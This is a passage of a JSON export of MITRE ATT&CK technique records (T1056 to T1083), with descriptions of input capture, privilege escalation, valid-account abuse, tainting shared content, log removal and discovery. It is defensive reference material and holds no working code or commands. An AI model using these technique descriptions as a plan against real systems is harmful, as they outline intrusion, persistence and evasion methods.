    "technique_description": "<p>Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. <a href=\"https://attack.mitre.org/techniques/T1056/004\">Credential API Hooking</a>) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. <a href=\"https://attack.mitre.org/techniques/T1056/003\">Web Portal Capture</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/569.html",
        "description": "none",
        "external_id": "CAPEC-569"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
    "platform": "linux|macos|windows|network",
    "tid": "T1056",
    "technique": "Input Capture",
    "tactic": "credential-access",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|kernel-drivers|loaded-dlls|powershell-logs|process-command-line-parameters|process-monitoring|user-interface|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1056.001",
      "T1056.002",
      "T1056.003",
      "T1056.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. <a href=\"https://attack.mitre.org/techniques/T1056/004\">Credential API Hooking</a>) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. <a href=\"https://attack.mitre.org/techniques/T1056/003\">Web Portal Capture</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/569.html",
        "description": "none",
        "external_id": "CAPEC-569"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
    "platform": "linux|macos|windows",
    "tid": "T1057",
    "technique": "Process Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1057\">Process Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->In Windows environments, adversaries could obtain details on running processes using the <a href=\"https://attack.mitre.org/software/S0057\">Tasklist</a> utility via <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> or <!-- raw HTML omitted -->Get-Process<!-- raw HTML omitted --> via <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>. Information about processes can also be extracted from the output of <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a> calls such as <!-- raw HTML omitted -->CreateToolhelp32Snapshot<!-- raw HTML omitted -->. In Mac and Linux, this is accomplished with the <!-- raw HTML omitted -->ps<!-- raw HTML omitted --> command. Adversaries may also opt to enumerate processes via /proc.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/573.html",
        "description": "none",
        "external_id": "CAPEC-573"
      }
    ]
  },
  {
    "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
    "platform": "linux|macos|windows|network",
    "tid": "T1059",
    "technique": "Command and Scripting Interpreter",
    "tactic": "execution",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1059.001",
      "T1059.002",
      "T1059.003",
      "T1059.004",
      "T1059.005",
      "T1059.006",
      "T1059.007",
      "T1059.008"
    ],
    "count_subtechniques": 8,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of <a href=\"https://attack.mitre.org/techniques/T1059/004\">Unix Shell</a> while Windows installations include the <a href=\"https://attack.mitre.org/techniques/T1059/003\">Windows Command Shell</a> and <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are also cross-platform interpreters such as <a href=\"https://attack.mitre.org/techniques/T1059/006\">Python</a>, as well as those commonly associated with client applications such as <a href=\"https://attack.mitre.org/techniques/T1059/007\">JavaScript/JScript</a> and <a href=\"https://attack.mitre.org/techniques/T1059/005\">Visual Basic</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in <a href=\"https://attack.mitre.org/tactics/TA0001\">Initial Access</a> payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
    "platform": "linux|macos|windows",
    "tid": "T1068",
    "technique": "Exploitation for Privilege Escalation",
    "tactic": "privilege-escalation",
    "datasources": "application-logs|process-monitoring|windows-error-reporting",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exploit software vulnerabilities in an attempt to collect elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.<!-- raw HTML omitted --><!-- raw HTML omitted -->When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
    "platform": "linux|macos|windows|office-365|azure-ad|aws|gcp|azure|saas",
    "tid": "T1069",
    "technique": "Permission Groups Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|office-365-account-logs|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1069.001",
      "T1069.002",
      "T1069.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/576.html",
        "description": "none",
        "external_id": "CAPEC-576"
      }
    ]
  },
  {
    "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
    "platform": "linux|macos|windows",
    "tid": "T1070",
    "technique": "Indicator Removal on Host",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1070.001",
      "T1070.002",
      "T1070.003",
      "T1070.004",
      "T1070.005",
      "T1070.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as <a href=\"https://attack.mitre.org/techniques/T1139\">Bash History</a> and /var/log/*.<!-- raw HTML omitted --><!-- raw HTML omitted -->These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/93.html",
        "description": "none",
        "external_id": "CAPEC-93"
      }
    ]
  },
  {
    "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
    "platform": "linux|macos|windows",
    "tid": "T1071",
    "technique": "Application Layer Protocol",
    "tactic": "command-and-control",
    "datasources": "dns-records|netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1071.001",
      "T1071.002",
      "T1071.003",
      "T1071.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
    "platform": "linux|macos|windows",
    "tid": "T1072",
    "technique": "Software Deployment Tools",
    "tactic": "execution",
    "datasources": "authentication-logs|binary-file-metadata|file-monitoring|process-monitoring|process-use-of-network|third-party-application-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.<!-- raw HTML omitted --><!-- raw HTML omitted -->The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it’s intended purpose.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/187.html",
        "description": "none",
        "external_id": "CAPEC-187"
      }
    ]
  },
  {
    "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
    "platform": "linux|macos|windows",
    "tid": "T1072",
    "technique": "Software Deployment Tools",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|binary-file-metadata|file-monitoring|process-monitoring|process-use-of-network|third-party-application-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.<!-- raw HTML omitted --><!-- raw HTML omitted -->The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it’s intended purpose.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/187.html",
        "description": "none",
        "external_id": "CAPEC-187"
      }
    ]
  },
  {
    "id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1074",
    "technique": "Data Staged",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1074.001",
      "T1074.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https://attack.mitre.org/techniques/T1560\">Archive Collected Data</a>. Interactive command shells may be used, and common functionality within <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may <a href=\"https://attack.mitre.org/techniques/T1578/002\">Create Cloud Instance</a> and stage data in that instance.(Citation: Mandiant M-Trends 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.</p>\n",
    "technique_references": [
      {
        "source_name": "PWC Cloud Hopper April 2017",
        "url": "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf",
        "description": "PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
    "platform": "linux|macos|windows|aws|gcp|azure|saas|office-365|azure-ad",
    "tid": "T1078",
    "technique": "Valid Accounts",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1078.001",
      "T1078.002",
      "T1078.003",
      "T1078.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.<!-- raw HTML omitted --><!-- raw HTML omitted -->The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
    "platform": "linux|macos|windows|aws|gcp|azure|saas|office-365|azure-ad",
    "tid": "T1078",
    "technique": "Valid Accounts",
    "tactic": "persistence",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1078.001",
      "T1078.002",
      "T1078.003",
      "T1078.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.<!-- raw HTML omitted --><!-- raw HTML omitted -->The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
    "platform": "linux|macos|windows|aws|gcp|azure|saas|office-365|azure-ad",
    "tid": "T1078",
    "technique": "Valid Accounts",
    "tactic": "privilege-escalation",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1078.001",
      "T1078.002",
      "T1078.003",
      "T1078.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.<!-- raw HTML omitted --><!-- raw HTML omitted -->The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
    "platform": "linux|macos|windows|aws|gcp|azure|saas|office-365|azure-ad",
    "tid": "T1078",
    "technique": "Valid Accounts",
    "tactic": "initial-access",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1078.001",
      "T1078.002",
      "T1078.003",
      "T1078.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.<!-- raw HTML omitted --><!-- raw HTML omitted -->The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
    "platform": "windows",
    "tid": "T1080",
    "technique": "Taint Shared Content",
    "tactic": "lateral-movement",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p><!-- raw HTML omitted -->Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary’s code on a remote system. Adversaries may use tainted shared content to move laterally.<!-- raw HTML omitted --><!-- raw HTML omitted -->A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses <a href=\"https://attack.mitre.org/techniques/T1547/009\">Shortcut Modification</a> of directory .LNK files that use <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to look like the real directories, which are hidden through <a href=\"https://attack.mitre.org/techniques/T1564/001\">Hidden Files and Directories</a>. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user’s expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/562.html",
        "description": "none",
        "external_id": "CAPEC-562"
      },
      {
        "source_name": "Retwin Directory Share Pivot",
        "url": "https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html",
        "description": "Routin, D. (2017, November 13). Abusing network shares for efficient lateral movements and privesc (DirSharePivot). Retrieved April 12, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1082",
    "technique": "System Information Discovery",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1082\">System Information Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Tools such as <a href=\"https://attack.mitre.org/software/S0096\">Systeminfo</a> can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <!-- raw HTML omitted -->systemsetup<!-- raw HTML omitted --> command, but it requires administrative privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/312.html",
        "description": "none",
        "external_id": "CAPEC-312"
      },
      {
        "source_name": "Amazon Describe Instance",
        "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
        "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Instances Resource",
        "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
        "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Virutal Machine API",
        "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get",
        "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
    "platform": "linux|macos|windows",
    "tid": "T1083",
    "technique": "File and Directory Discovery",
    "tactic": "discovery",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1083\">File and Directory Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Many command shell utilities can be used to obtain this information. Examples include <!-- raw HTML omitted -->dir<!-- raw HTML omitted -->, <!-- raw HTML omitted -->tree<!-- raw HTML omitted -->, <!-- raw HTML omitted -->ls<!-- raw HTML omitted -->, <!-- raw HTML omitted -->find<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->locate<!-- raw HTML omitted -->. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/127.html",
        "description": "none",
        "external_id": "CAPEC-127"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/497.html",
        "description": "none",
        "external_id": "CAPEC-497"
